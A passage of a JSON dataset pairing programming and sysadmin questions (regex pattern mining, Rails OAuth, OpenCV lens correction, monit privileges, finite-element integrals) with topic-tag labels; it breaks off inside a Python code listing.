[
  {
    "id": "_cs.61038",
    "source": "Find string patterns preferably in regex for string streams <eos> I am trying to classify the data in a database columns. DB has about 90 million entries.The main goal is to find different patterns in columns to leverage it for create look alike data. The data columns has entries which can easily look like patterns as : CUST1212,CUST1213,CUST1214...,  number sequential after CUST CODE1213,CODE1242,CODE1289...   random numbers after code CUST1213,MUST8324,FIFA12313...   009-123-2123,003-124-2314,006-213-5322, INTER122,INTER222,INTER322...,  number increasing in batch of 100 OM|ON|TO, IO|OI|UH...,  pipe delimited  some 6 and 7 digits number.The issue is there are so many patterns and looks like creating patterns manually based on data is out of option.I would really appreciate if one can point to how can I build a collection of patterns preferably by usage frequency.What I started is 1. Segregate the data as per their length as patterns usually generate same string length, sorted them and stored them in different files. 2. Then classifying them further as per Alphabet prefix or numeric prefix. 3. For alpha-prefix segregate further on common alphabets at start.Now seems I am lost and sincerely hoping if one can point out to me what are my options and probably best to took.I believe if end of computation if get something like patterns in data and their frequency e.g. CUST[0-9]{4} -> 10k times, [a-zA-Z]{4} -> 50k times [0-9]{3}-[0-9]{3}-[0-9]{4} 10K times etc....., it would be great.Thanks",
    "target": "regular expressions;data mining;classification;pattern recognition"
  },
  {
    "id": "_webmaster.15113",
    "source": "Do users resize text? <eos> I'm redesigning a website. For certain content areas the layout is fine at my text size but screws up if I set the text any bigger. I often resize pages with Firefox, but the whole page resizes so the layout still works. So, should I worry about users having larger text but the same CSS otherwise? I don't know how to test for this sort of thing. The site works fine with every browser I've looked at it with. I know some usability devices change layouts but don't they ignore normal styles altogether?",
    "target": "usability"
  },
  {
    "id": "_webapps.1318",
    "source": "Is there a web service that can receive faxes and store them in a PDF format? <eos> Is there a web service that can receive faxes and store them in a PDF format? I would like to be able to keep my current fax number.",
    "target": "webapp rec;storage;pdf;fax"
  },
  {
    "id": "_codereview.27144",
    "source": "Rails service + OAuth <eos> I'm having trouble structuring the logic of OAuth integration into my web app. In the app, a user creates a Report that consists of data from their Google Analytics account.User steps:User clicks 'New Report'Google presents the 'Allow Access' page for OAuth accessUser is presented with a list of their GA web properties and selects oneA report is created using data from the selected web propertyMy issue is in structuring the code below.When the user clicks New Report, they are actually redirected to google_analytics#ga_session to begin the authorization process. The code to retrieve the user's web properties succeeds, but the code at the bottom needs to be refactored so it is reusable when retrieving web property data. The main two issues I can't figure out is how to make the Google Analytics instance reusable and how to structure the OAuth redirects.  Retrieve web properties:GoogleAnalyticsControllerdef ga_session    client = OAuth2::Client.new(ENV['GA_CLIENT_ID'], ENV['GA_SECRET_KEY'], {        :authorize_url => 'https://accounts.google.com/o/oauth2/auth',        :token_url => 'https://accounts.google.com/o/oauth2/token'    })    redirect_to client.auth_code.authorize_url({         :scope => 'https://www.googleapis.com/auth/analytics.readonly',         :redirect_uri => ENV['GA_OAUTH_REDIRECT_URL'],         :access_type => 'offline'     })  end  def oauth_callback    session[:oauth_code] = params[:code]    redirect_to new_report_path  endReportsControllerdef new     @report = Report.new     ga_obj = GoogleAnalytics.new     ga_obj.initialize_ga_session(session[:oauth_code])     @ga_web_properties = ga_obj.fetch_web_propertiesendGoogleAnalytics modeldef initialize_ga_session(oauth_code)    client = OAuth2::Client.new(ENV['GA_CLIENT_ID'], ENV['GA_SECRET_KEY'], {        :authorize_url => 'https://accounts.google.com/o/oauth2/auth',        :token_url => 'https://accounts.google.com/o/oauth2/token'    })    access_token_obj = client.auth_code.get_token(oauth_code, :redirect_uri => ENV['GA_OAUTH_REDIRECT_URL'])    self.user = Legato::User.new(access_token_obj)  end  def fetch_web_properties    self.user.web_properties  endRetrieve web property data: when creating the reportReportsControllerdef create    @report = Report.new(params[:report])    @report.get_top_traffic_keywords(session[:oauth_code])    create!endReport Modeldef get_keywords(oauth_code)    ga = GoogleAnalytics.new    ga.initialize_ga_session(oauth_code) # this is a problem b/c the user will be redirected the new_report_path after the callack    self.url = ga.fetch_url(self.web_property_id)    self.keywords = # Get keywords for self.url from another service    keyword_revenue_data(oauth_code)enddef keyword_revenue_data(oauth_code)    ga = GoogleAnalytics.new    ga.initialize_ga_session(oauth_code)    revenue_data = # Get revenue dataend",
    "target": "ruby;ruby on rails;oauth"
  },
  {
    "id": "_webmaster.58597",
    "source": "Use Google Adwords to track click conversions <eos> I have read that Google Analytics supports click conversions (Tracking click conversions with Google Analytics).But I think I rather have conversions tracked within AdWords so I have a single source where I can monitor performance of specific campaigns.So, is there a way for me to setup click conversions within AdWords, I could not find it here https://support.google.com/adwords/answer/2375435 or here https://support.google.com/adwords/answer/1722054What I need specifically:be able to measure if a link with a specific class was clicked and of course assign that conversion to the campaign via which the user arrivedonly measure a conversion if a link was clicked by a user who camevia one of my AdWords campaigns (so a user who would navigate directly to my siteand clicked that link would not be tracked as a conversionUPDATEI do not have a landing page on which I can measure a conversion, since I'm an affiliate and don't sell the products myself, but redirect users to 3rd party publisher sites, I don't know whether a user actually buys the product. But I can get a pretty good indication of a conversion by measuring the click on a link that is directed to an external site. See how it works here: http://www.wonderweddings.com/weddingshopfrom this page and from any productdetail page the user can click to an external site. THAT is the click I want to set as a conversion.",
    "target": "google adwords;tracking;conversions"
  },
  {
    "id": "_codereview.154933",
    "source": "Word Search in LeetCode <eos> I solved this programming challenge:Given a 2D board and a word, find if the word exists in the grid. The word can be constructed from letters of sequentially adjacent  cell, where adjacent cells are those horizontally or vertically  neighboring. The same letter cell may not be used more than once.For example,  Given board =[  ['A','B','C','E'],  ['S','F','C','S'],  ['A','D','E','E']]word = ABCCED, -> returns trueword = SEE, -> returns trueword = ABCB, -> returns falseclass Solution {public:  bool DFS(vector<vector<char>> &board, string word,           vector<vector<bool>> visited, int i, int j, int curr) {    if (i < 0 || j < 0 || i >= board.size() || j >= board[0].size()) {      return false;    }    if (visited[i][j] || board[i][j] != word[curr]) {      return false;    }    visited[i][j] = true;    ++curr;    if (curr == word.size()) {      return true;    }    return DFS(board, word, visited, i + 1, j, curr) || // Down           DFS(board, word, visited, i, j + 1, curr) || // Right           DFS(board, word, visited, i - 1, j, curr) || // Up           DFS(board, word, visited, i, j - 1, curr);   // Left  }  bool exist(vector<vector<char>> &board, string word) {    for (int i = 0; i < board.size(); ++i) {      for (int j = 0; j < board[i].size(); ++j) {        if (word[0] == board[i][j]) {          vector<vector<bool>> visited(board.size(),                                       vector<bool>(board[0].size(), false));          if (DFS(board, word, visited, i, j, 0)) {            return true;          }        }      }    }    return false;  }};My solution ranks at around 2% faster when compared to other solutions with the same language. My main desire from reviews are performance improvements.",
    "target": "c++;performance;programming challenge;c++11"
  },
  {
    "id": "_unix.42357",
    "source": "How can I stop dolphin from reading my entire home directory tree in order to make it usable on AFS? <eos> At work, I would like to use KDE's dolphin as a file manager. However, our home directories reside on an AFS share [1]. When starting dolphin, it becomes unresponsive for dozens of minutes. stracing it reveals that it tries to open all the nodes in our AFS tree:openat(AT_FDCWD, /afs/somewhereElse.tld, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXECI need to stop dolphin from doing that; this behaviour makes the program completely unusable on AFS trees. Is there some setting that controls this?[1] If you have never worked with AFS before, for the sake of this question, assume that there is a root directory that has subtrees from different universities, research institutes etc. mounted below it. The data in those subtrees really reside at the remote sites, so access is slow and resource-intensive.",
    "target": "kde;afs;dolphin"
  },
  {
    "id": "_cstheory.20401",
    "source": "Sub optimal regex equivalence <eos> Regex Equivalence is a hard problem which in general takes exponential space and exponential time. Are there any approximation/sub-optimal algorithms with some theoretical guarantees over equivalence available?",
    "target": "approximation algorithms;automata theory;regular expressions"
  },
  {
    "id": "_codereview.63995",
    "source": "Counting occurrences of different categories of characters <eos> This is a sort of follow up to my previous question:Counting the number of character occurrencesThis time I have written code that still counts the number of different characters in a string, but with the added ability to find categories of characters. For example, finding how many numbers are in the string, how many punctuation characters are in the string.Is there anything I should be doing differently? Any improvements? Also, I'm trying to learn better OOP design and software design and best practice, so any advice on that would also be helpful.A couple of notes:From what I've read immutable objects are preferred, so I created the results class to have private setters and return a read only dictionary to stop something else from changing it.Is the way I've created the CharacterCountResult object from CharacterCount a good thing to do? As in, am I doing it correctly?static void Main(string[] args){    var i = CharacterCount.Count(@Hello, World! $% ^ powejdoiwr3u?!?!!/1;';'\\\\z\\\\]p[\\][z]z\\,.,/???);    // Demonstrating some of the avaliable properties    Console.WriteLine(Alphanumeric: {0}\\nLowercase: {1}\\nUppercase: {2}\\nPunctuation: {3}\\nDigits: {4}\\nSymbols: {5},        i.LetterAndDigitCount, i.LowercaseCount, i.UppercaseCount, i.PunctuationCount, i.DigitCount, i.SymbolCount);    foreach (var character in i.GetCharacterDictionary())    {        Console.WriteLine({0} - {1}, character.Key, character.Value);    }}This is the class that counts the characters in the string:class CharacterCount{    public static CharacterCountResult Count(string stringToCount)    {        var tempDictionary = new Dictionary<char, uint>();        uint controlCount = 0;        uint highSurrogatecount = 0;        uint lowSurrogateCount = 0;        uint whiteSpaceCount = 0;        uint symbolCount = 0;        uint punctuationCount = 0;        uint separatorCount = 0;        uint letterCount = 0;        uint digitCount = 0;        uint numberCount = 0;        uint letterAndDigitCount = 0;        uint lowercaseCount = 0;        uint upperCaseCount = 0;        // Build dictionary of characters and occurrence of characters.        foreach (var character in stringToCount)        {            if (!tempDictionary.ContainsKey(character))            {                tempDictionary.Add(character, 1);            }            else            {                tempDictionary[character]++;            }        }        // Iterate over string and count various types of characters.        foreach (var character in stringToCount)        {            if (char.IsNumber(character))            {                numberCount++;            }            if (char.IsPunctuation(character))            {                punctuationCount++;            }            if (char.IsSeparator(character))            {                separatorCount++;            }            if (char.IsSymbol(character))            {                symbolCount++;            }            if (char.IsUpper(character))            {                upperCaseCount++;            }            if (char.IsWhiteSpace(character))            {                whiteSpaceCount++;            }        }        var result = new CharacterCountResult(controlCount, highSurrogatecount, lowSurrogateCount, whiteSpaceCount,            symbolCount, punctuationCount, separatorCount, letterCount, digitCount, numberCount, letterAndDigitCount,            lowercaseCount, upperCaseCount, tempDictionary);        return result;    }}And this class is the result of the character counting. It has properties which can be used to find the number of different types of characters as well as a method which returns a ReadOnlyDictionary<char, uint> that can be used to find the number of times each specific character occurs:class CharacterCountResult{    // Unicode special characters.    public uint ControlCount { get; private set; }    public uint HighSurrogateCount { get; private set; }    public uint LowSurrogateCount { get; private set; }    // Textual special characters.    public uint WhiteSpaceCount { get; private set; }    public uint SymbolCount { get; private set; }    public uint PunctuationCount { get; private set; }    public uint SeparatorCount { get; private set; }    //Letters, digits, numbers.    public uint LetterCount { get; private set; }    public uint DigitCount { get; private set; }    public uint NumberCount { get; private set; }    public uint LetterAndDigitCount { get; private set; }    public uint LowercaseCount { get; private set; }    public uint UppercaseCount { get; private set; }    private Dictionary<char, uint> _characterDictionary = new Dictionary<char, uint>();    public CharacterCountResult(uint controlCount, uint highSurrogateCount, uint lowSurrogateCount,        uint whiteSpaceCount, uint symbolCount, uint punctuationCount, uint separatorCount, uint letterCount,        uint digitCount, uint numberCount, uint letterAndDigitCount, uint lowercaseCount, uint uppercaseCount,        Dictionary<char, uint> characterDictionary)    {        ControlCount = controlCount;        HighSurrogateCount = highSurrogateCount;        LowSurrogateCount = lowSurrogateCount;        WhiteSpaceCount = whiteSpaceCount;        SymbolCount = symbolCount;        PunctuationCount = punctuationCount;        SeparatorCount = separatorCount;        LetterCount = letterCount;        DigitCount = digitCount;        NumberCount = numberCount;        LetterAndDigitCount = letterAndDigitCount;        LowercaseCount = lowercaseCount;        UppercaseCount = uppercaseCount;        _characterDictionary = characterDictionary;    }    public ReadOnlyDictionary<char, uint> GetCharacterDictionary()    {        var readOnly = new ReadOnlyDictionary<char, uint>(_characterDictionary);        return readOnly;    }}",
    "target": "c#;beginner;object oriented;design patterns"
  },
  {
    "id": "_softwareengineering.348367",
    "source": "Handling composite objects in the Repository Pattern <eos> I'm fiddling around with OOP in building simple CRUD systems.I've decided to focus on using the Repository Pattern for separating Object business logic and Object data persistence (actually saving the object in a persistent data store, i.e a database).Saving a simple object is straightforwardclass Customer {  setData(data) {    this.data = data;  }}// PUT Customercustomer = new Customer();customer.setData(data);customerRepo.save(customer);But saving a composite object becomes a bit complicatedBut what happens if my Customer class is now includes other objects that also need to be persisted in the DB?In the following example, setting a customer's data also needs to create anAuditTrail which is a set of differences between the previous data and the new data passed in customer.setData().AuditTrail is a class and in this example it's a classic has-a relationship between Customer and AuditTrailclass Customer {  setData(data) {    // instantiate an auditTrailCalculator with some constants from the DB    auditTrail = auditTrailRepo.create();    // `calculate()` produces a diff between the previous data and the new data    this.auditTrail = auditTrail.calculate(this.data, data);  }  getAuditTrail() {    return this.auditTrail;  }}// PUT customercustomer = Customer();customer.setId(customerId);customer.setData(data);customerRepo.update(customer);auditTrailRepo.insert(customer.getAuditTrail());The above example looks clumsy.I'm instantiating the AuditTrail object using it's repo from within the Customer Object.For performing the whole update of a Customer I clumsily:Instantiate a new CustomerSet it's dataGet it's auditTrail that was generated inside the objectSave the AuditTrail to the DB using the AuditTrailRepoSave the Customer to the DB using the CustomerRepoMy questions:Is it correct to instantiate objects from their repo's from within other objects?Should I create a factory function instead, which instantiates both Objects, Customer & AuditTrail and return a composition of the 2?How should I handle saving this composite object? ",
    "target": "object oriented"
  },
  {
    "id": "_unix.379087",
    "source": "VNC to a linux desktop in HiDPI mode won't scale properly <eos> I have a linux mint Cinnamon desktop running in HiDPI.When I try to connect to it with a VNC client from my macbook (retina/hidpi display), the desktop shows up about 4x too big.I tried with mac's built in VNC viewer and also the real VNC client.I tried different settings in Real VNC's expert mode preferences - Scaling - AspectFit, 25%, etc; nothing seems to change the scaling.",
    "target": "linux;osx;vnc;display"
  },
  {
    "id": "_codereview.164194",
    "source": "Backward transformation implementation for a barrel eye lens aberration in c++ 14 (using opencv) <eos> I've made the following backwards transformation from a transformed source x,y point, to the resulting index of the actual image that I have, so I can avoid black spots appearing in my barrel eye lens image. I've used the formula focal_length * arctan(radius, focal_length) for image undistortion.  Here is the code I've used (its part of another class, but the rest of the class is not important):double BarrelAbberationClass::toDistortedRadius(const double r) const {    return m_focal_length * atan2(r, m_focal_length);}cv::Vec2d BarrelAbberationClass::transformBackward(const cv::Point &source_xy,                                               const cv::Mat &affine, const cv::Vec2d &center) {    const double x_affined = source_xy.x * affine.at<double>(0, 0) + affine.at<double>(0, 2);    const double y_affined = source_xy.y * affine.at<double>(1, 1) + affine.at<double>(1, 2);    const double r = cv::norm(cv::Vec2d(x_affined, y_affined));    const double theta = atan2(y_affined, x_affined);    const double new_r = toUnDistortedRadius(r);    const double new_i = (new_r * sin(theta) + center[1]);    const double new_j = (new_r * cos(theta) + center[0]);    return cv::Vec2d(new_j, new_i);}Basically, given a source x,y point, affine matrix for the transformation account for the center of my image actually being width/2 and height/2, and the visual bounds I would even be able to grab from in the non transformed image, then I warp the x and y affined points to the correct undistorted plane and return the calculated row and column i, j that would correspond to points in the original image (these must be floating point for use later in bilinear interpolation of positions in between others) I should also note that the code with affine.at<double>(...) were originally matrix operations. I saw in the profiler that this was slowing doing my code. Removing the matrix creation routines caused by matrix operations here increased my speed by 4.When profiling this code (I'm forced to use Windows + MingW for this, so I don't have many convenient profiling options; I've been using gprof) it looks like tan, cos, sin, and atan2 take up the vast majority of the time at -O3, with atan2 cos and sin each taking about 20% of the time.Here is the full implementation to give context:double BarrelAbberationClass::toDistortedRadius(const double r) const {    return m_focal_length * atan2(r, m_focal_length);}cv::Vec2d BarrelAbberationClass::transformBackward(const cv::Point &source_xy,                                               const cv::Mat &affine, const cv::Vec2d &center) {    const double x_affined = source_xy.x * affine.at<double>(0, 0) + affine.at<double>(0, 2);    const double y_affined = source_xy.y * affine.at<double>(1, 1) + affine.at<double>(1, 2);    const double r = std::hypot(x_affined, y_affined);    const double new_r = toUnDistortedRadius(r);    const double new_i = center[1] + (new_r / r) * y_affined;    const double new_j = center[0] + (new_r / r) * x_affined;    return cv::Vec2d(new_j, new_i);}double bilinearInterpolate(const cv::Mat &cv_source, const float x, const float y) {    const int px = static_cast<int>(x);    const int py = static_cast<int>(y);    const double p1 = cv_source.at<double>(py, px);    const double p2 = cv_source.at<double>(py, px + 1);    const double p3 = cv_source.at<double>(py + 1, px);    const double p4 = cv_source.at<double>(py + 1, px + 1);    const float fx = x - px;    const float fy = y - py;    const float fx1 = 1.0f - fx;    const float fy1 = 1.0f - fy;    const float w1 = fx1 * fy1;    const float w2 = fx * fy1;    const float w3 = fx1 * fy;    const float w4 = fx * fy;    return p1 * w1 + p2 * w2 + p3 * w3 + p4 * w4;}double BarrelAbberationClass::toUnDistortedRadius(const double r) const {    return m_focal_length * tan(r / m_focal_length);}cv::Point BarrelAbberationClass::transformForward(const cv::Point &source_xy,                                              const cv::Vec2d &center) {    const double x_translated = source_xy.x -center[0];    const double y_translated = source_xy.y -center[1];    const double r = std::hypot(x_translated, y_translated);    const double new_r = toDistortedRadius(r);    const uint64_t new_i = static_cast<uint64_t>(center[1] + (new_r / r) * y_translated);    const uint64_t new_j = static_cast<uint64_t>(center[0] + (new_r / r) * x_translated);    return cv::Point(new_j, new_i);}cv::Mat BarrelAbberationClass::getScaleMatrix(const cv::Rect &bounds,                                          const cv::Vec2d &center) {    const cv::Point new_tl = transformForward(bounds.tl(), center);    const cv::Point new_br = transformForward(bounds.br(), center);    const cv::Point diff = new_br - new_tl;    const double scale_x = diff.x / static_cast<double>(bounds.width);    const double scale_y = diff.y / static_cast<double>(bounds.height);    const double scale = scale_x > scale_y ? scale_x : scale_y;    cv::Mat scale_matrix = (cv::Mat_<double>(3, 3) << scale, 0, 0,            0, scale, 0,            0, 0, 1);    return scale_matrix;}cv::Mat& BarrelAbberationClass::calculateAberation(cv::Mat& imageData) {    const double center_x = imageData.size().width / 2;    const double center_y = imageData.size().height / 2;    const cv::Vec2d center(center_x, center_y);    const cv::Mat translate = (cv::Mat_<double>(3, 3) << 1, 0, -center_x,                                                         0, 1, -center_y,                                                         0, 0, 1);    const cv::Mat cpy = imageData.clone();    imageData.setTo(cv::Scalar(0));    const cv::Rect bounds(cv::Point(), cpy.size());    const cv::Mat scale = getScaleMatrix(bounds, center);    const cv::Mat affine = scale * translate;    for (uint64_t i = 0; i < cpy.rows; ++i) {        for (uint64_t j = 0; j < cpy.cols; ++j) {            const cv::Vec2d new_dpoint = transformBackward(cv::Point(j, i), affine, center);            const cv::Point new_point = {new_dpoint[0], new_dpoint[1]};            if (bounds.contains(new_point)) {                imageData.at<double>(i, j) = bilinearInterpolate(cpy, new_dpoint[0], new_dpoint[1]);            }        }    }    return imageData;}Here is the .h fileclass BarrelAbberationClass{protected:    const double m_focal_length;public:    BarrelDegredation(const double focal_length) : m_focal_length(focal_length) {};    cv::Mat& calculateAberation(cv::Mat& imageData);    double toDistortedRadius(const double r) const;    double toUnDistortedRadius(const double r) const;    cv::Point transformForward(const cv::Point &source_xy, const cv::Vec2d &center);    cv::Mat getScaleMatrix(const cv::Rect &bounds, const cv::Vec2d &center);    cv::Vec2d transformBackward(const cv::Point &source_xy,                                const cv::Mat &affine, const cv::Vec2d &center);}",
    "target": "c++;matrix;c++14"
  },
  {
    "id": "_softwareengineering.342592",
    "source": "persistence as a service: what does that mean? <eos> I read this in a book:Most of the time, calls to third-party products are entangled  throughout the code. But if you really abstracted the idea of a  database outto the point where it simply provides persistence as aservicethen you have the flexibility to change horses in midstream.Could you please explain to me in plain English (or by example) what does the idea written above in bold mean?EDIT:I quoted the paragraph above from a book  called: The Pragmatic Programmer on page 60. The more appropriate tag for my question is reversibility but it is not available.",
    "target": "scalability"
  },
  {
    "id": "_scicomp.14470",
    "source": "Beginning Computer Programming <eos> I was 7 years old when I learnt BASIC. Then I learnt C and Visual Basic till the age of 13. I stopped programming for 4 years continuously, and don't remember much about it now. I have lost the skill, and need to do learn it all over again.How can I learn basics and the terminology of programming all over  again using C?Can someone suggest an E-Book for that?",
    "target": "c"
  },
  {
    "id": "_unix.219258",
    "source": "User settings for monit? Should it run as root, or it's own user? <eos> I'm trying to install monit on an Ubuntu 12.04 server.  I have it set up, and configured (i think), but i'm not sure what user it's supposed to run as.My user on the server is called deploy, and my monitrc file looks like this:$ ls -l /etc/monit/monitrc-rwx------ 1 deploy deploy 10229 2015-07-30 12:38 /etc/monit/monitrcie, it's owned by the user i log into the server with.  I've started the monit daemon, and i can see it running with ps and i can log into the web interface for it.What i'm unsure about is how to give it priveleges to restart processes.  For example, nginx:  if i want to restart nginx myself i need to do sudo /etc/init.d/nginx restartDoes this mean that monit needs to do sudo as well in order to restart it?  Or, should i configure monit with its own user, and set that user up so that it can restart nginx (and any other services which monit needs to restart or access) without sudo?thanks, Max ",
    "target": "ubuntu;sudo;nginx;monit"
  },
  {
    "id": "_unix.255226",
    "source": "Should I use KVM or Xen ? What are the main differences? <eos> I've spent a few hours trying to understand the differences between KVM and Xen without much succes. So both are Type 1 Hypervisors with comparable performances (source) and I don't understand what differenciates them.The only specific needs I have are that the guest OS isn't able to interract with the hosts's files (which seems to be the default behaviour) and that both the host and the guest can use their own GPU for video rendering. That seems not to be a problem as both Xen and KVM support some kind of GPU/VGA/PCI pass-through as long as there are two physical graphics cards.So what are the differences between Xen and KVM ? Is one or the other more suitable for graphical performances ?Thanks in advance for the help :)",
    "target": "kvm;graphics;xen;gpu"
  },
  {
    "id": "_codereview.74775",
    "source": "AI for an online contest <eos> I'm actually creating an AI for the online contest Vindinium. The fact is that's also an exam for my school because I'm going to have a note with that work.I created an AI based on ants pheromones with a recursive function. The bot is working but only on small maps. I need to send my answer turn after turn (which movement my bot is going to make) in only one second. But one of my functions: to apply all ant pheromones on the map is taking too long.At each turn, if my bot has got a new objectif, he is going to spreads pheromones on the map with some value on each squares of the map. An on each square the value can propagate to to all neighbors until the square of the final destination.public function appliCoeff($x, $y, $sx, $sy, $value){      // Optimisation du code    $newval = $value+1;    if( /* Special condition */ )        $this->setReccurence($x, $y-1, $sx, $sy, $newval);    if( /* Special condition */ )        $this->setReccurence($x-1, $y, $sx, $sy, $newval);    if( /* Special condition */ )        $this->setReccurence($x+1, $y, $sx, $sy, $newval);    if( /* Special condition */ )        $this->setReccurence($x, $y+1, $sx, $sy, $newval);    if( /* Special condition */ )        $this->appliCoeff($x, $y-1, $sx, $sy, $newval);    if( /* Special condition */ )        $this->appliCoeff($x-1, $y, $sx, $sy, $newval);    if( /* Special condition */ )        $this->appliCoeff($x+1, $y, $sx, $sy, $newval);    if( /* Special condition */ )        $this->appliCoeff($x, $y+1, $sx, $sy, $newval);}Do you have any idea to optimize it? Do you think threads are a good idea? I never used them and I don't know if it's such a good idea to parallelize treatments?",
    "target": "php;optimization;performance;recursion"
  },
  {
    "id": "_unix.162900",
    "source": "What is this folder /run/user/1000? <eos> What is this folder: /run/user/1000 on my Fedora system and what does it do?~ $ df -hFilesystem      Size  Used Avail Use% Mounted ontmpfs           1.2G   20K  1.2G   1% /run/user/1000",
    "target": "directory structure"
  },
  {
    "id": "_unix.105759",
    "source": "mutt: trash macro <eos> In my previous question I have learned how to implement trash functionality in mutt. unset confirmappendfolder-hook . set trash==trashfolder-hook trash$ unset trashThat works well, except that I have to confirm every deletion. I would like it to work without the delete confirmation. So that I only need to press d and then $ to sync, without being asked for confirmation.Can somebody please suggest how to do it?",
    "target": "mutt"
  },
  {
    "id": "_scicomp.27441",
    "source": "Line integral along the edge of an isoparametrically mapped triangle <eos> I need to integrate the following function on the line segment from $P_{1} = \\begin{bmatrix}-2\\\\-1\\end{bmatrix}$ to$P_{2} = \\begin{bmatrix}1\\\\2\\end{bmatrix}$:$$\\int_{P_{1}}^{P_{2}} 4x + y \\ ds$$This question take part into the implementation of a 2D finite element solver. How I plan to do itSuppose that the following transformation is used to transform a general triangular element K to the standard triangular element $T_{st}$ :$$ x = P(\\xi,\\eta) $$$$y = Q(\\xi,\\eta)$$This corresponds to this physical mapping in fact:Then we have:$$dx = \\frac{\\delta x}{\\delta \\xi}d\\xi + \\frac{\\delta x}{\\delta \\eta}d\\eta = J_{11}d\\xi + J_{21}d\\eta $$$$dy = \\frac{\\delta y}{\\delta \\xi}d\\xi + \\frac{\\delta y}{\\delta \\eta}d\\eta = J_{12}d\\xi + J_{22}d\\eta $$Along the side $P_{1} - P_{2}$, the coordinate $\\xi$ is in fact always fixed. So we can write $d\\eta = 0$ . Using this it comes:$$ dx = (\\frac{\\delta x}{\\delta \\xi})_{\\eta = 0} \\ d\\xi  = J_{11}(\\xi,0) d\\xi $$$$ dy = (\\frac{\\delta y}{\\delta \\xi})_{\\eta = 0} \\ d\\xi  = J_{12}(\\xi,0) d\\xi $$Therefore:$$ ds = \\sqrt{J_{11}^{2}(\\xi,0)+ J_{12}^{2}(\\xi,0)} d\\xi $$So we can rewrite the integral with a variable change accordingly:$$\\int_{P_{1}}^{P_{2}} 4x + y \\ ds = \\int_{0}^{1} B(P(\\xi,0),Q(\\xi,0)) \\ \\sqrt{J_{11}^{2}(\\xi,0)+ J_{12}^{2}(\\xi,0)} d\\xi $$Using this isoparametrical formulation, we can finally compute the numerical integral thanks to a 4 node quadrature :$$ I = \\sum_{i=1}^{gauss \\ point} w_{i} B(P(\\xi_{i},0),Q(\\xi_{i},0)) \\ \\sqrt{J_{11}^{2}(\\xi_{i},0)+ J_{12}^{2}(\\xi_{i},0)} d\\xi $$This can be done with this really simple code in Python (at least I was thinking):Edit of the code : 20.07.2017 => removed an error (dividing by two without reason)# -*- coding: utf-8 -*-from __future__ import division # avoid integer problem of division#Import zoneimport numpy as npimport math#Define shape functiondef P1shapes(r,s):    S = np.array([1-r-s,r,s])    dSdr = np.array([-1,1,0])    dSds = np.array([-1,0,1])    return S,dSdr,dSds#Jacobian functiondef isopmap(x,y,r,s,shapefcn):    # x = vector of x coordinate of the element's point    #shapefcn = P1shapes    S,dSdr,dSds = shapefcn(r,s);    j11=np.dot(dSdr,x)    j12=np.dot(dSdr,y)    j21=np.dot(dSds,x)    j22=np.dot(dSds,y)    detJ=j11*j22-j12*j21    dSdx=( j22*dSdr-j12*dSds)/detJ    dSdy=(-j21*dSdr+j11*dSds)/detJ    return S,dSdx,dSdy,detJ,j11,j12,j21,j22#Gauss point quadratureqwgts=np.array([-27/48,25/48,25/48,25/48])rspts=np.array([[1/3,1/3],[0.2,0.2],[0.6,0.2],[0.2,0.6]])def B(x,y):    z = 4 *x + y    return z#Point of the 3 nodes triangles (test case)x = [-2, 1 ,-1]y = [-1 ,2 ,3]#P1-P2int_total = 0#Begin integral on segmentfor q in range(len(qwgts)):    r = rspts[q,0] # r coordinate of the q_th quadrature point    s = rspts[q,1] # s coordinate of the q_th quadrature point    #Define ds and Map x_physical, y_physical    S,dSdx,dSdy,detJ,j11,j12,j21,j22 = isopmap(x,y,r,0,P1shapes)    ds = math.sqrt(math.pow(j11,2) + math.pow(j12,2))    x_physical = np.dot(x,S)    y_physical = np.dot(y,S)    B_gausspoint = B(x_physical,y_physical)    wxarea = B_gausspoint*qwgts[q]*ds    int_total += wxareaprint int_totalThe result gives:$$ I =  -16.97 $$Of course if I change the third point of the triangle, it should change nothing. With this:x = [-2, 1 ,-1]y = [-1 ,2 ,7]We again find for the path $P_{1} - P_{2}$:$$ I =  -16.97 $$What we should expectFrom an analytical point of view we have for the parametrisation $x = -2 + 3t$ and $y = -1 + 3t$. This allow to have:$$ds = \\sqrt{   (\\frac{dx}{dt})^{2}  +  (\\frac{dy}{dt})^{2}} \\ dt = 3\\sqrt{2} \\ dt$$So we have: $$\\int_{P_{1}}^{P_{2}} 4 x + y \\ ds = \\int_{0}^{1} 4(-2+3t) + (-1+3t)) \\ 3\\sqrt{2} \\ dt = -6.36$$Actually, we can see that the numerical method is not working...My questionDid I make a mystake in the main concept? Is it an implementation error?I think it could be an interesting question for all the people that try to implement a path integral on a FEM mesh.I really did'nt find litterature example to check my implementation.Extension of the questionIs there an other way/more elegant way to compute a path integral on the boundary of my FEM model? It seems that I have everything (non linear solver, quadrature integral for assembly of stiffness matrix, shape function, isoparametric formulation), but I'm really stuck at this point. Without this I never would be able to compute for example:$$ R_{ij} = \\int \\kappa(x,y) \\ \\phi_{i} \\ \\phi_{j} \\ dS \\ for \\ i \\ = \\ 1,2 $$EDIT 20.07.17 : Additional testActually, if we take for the integral $B(x,y) = 1$, we are integrating the length of the path :def B(x,y):    z = 1    return zIf we run the code, we end up with :$$ I = 4.24$$Which is the correct value since the length of the path:$$\\sqrt{(P_{2}^{x} -P_{1}^{x})^{2} + (P_{2}^{y} -P_{1}^{y})^{2} } = 4.24$$Thank you in advance. Correct code (see explanation on accepted answer)# -*- coding: utf-8 -*-from __future__ import division # avoid integer problem of division#Import zoneimport numpy as npimport math#Define shape functiondef P1shapes(r,s):    S = np.array([1-r-s,r,s])    dSdr = np.array([-1,1,0])    dSds = np.array([-1,0,1])    return S,dSdr,dSds#Jacobian functiondef isopmap(x,y,r,s,shapefcn):    # x = vector of x coordinate of the element's point    #shapefcn = P1shapes    S,dSdr,dSds = shapefcn(r,s);    j11=np.dot(dSdr,x)    j12=np.dot(dSdr,y)    j21=np.dot(dSds,x)    j22=np.dot(dSds,y)    detJ=j11*j22-j12*j21    dSdx=( j22*dSdr-j12*dSds)/detJ    dSdy=(-j21*dSdr+j11*dSds)/detJ    return S,dSdx,dSdy,detJ,j11,j12,j21,j22#Gauss point quadrature    def transfo1D(a,b,ti):    #Inverse mapping to find r coordinate from 2D [r,0] space corresponding to 1D space [-1;1] defined by t    epsylon_i = ((b-a)/2.0)*ti + ((b+a)/2.0)    return epsylon_idef B(x,y):    z = 4*math.pow(x,3)    return zcoordinate=np.array([-0.774596669,0.000000000,0.774596669])weight=np.array([0.555555556,0.888888889,0.555555556])#Point of the 3 nodes triangles (test case)x = [-2, 1 ,-1]y = [-1 ,2 ,3]#P1-P2int_total = 0#Begin integral on segmentfor q in 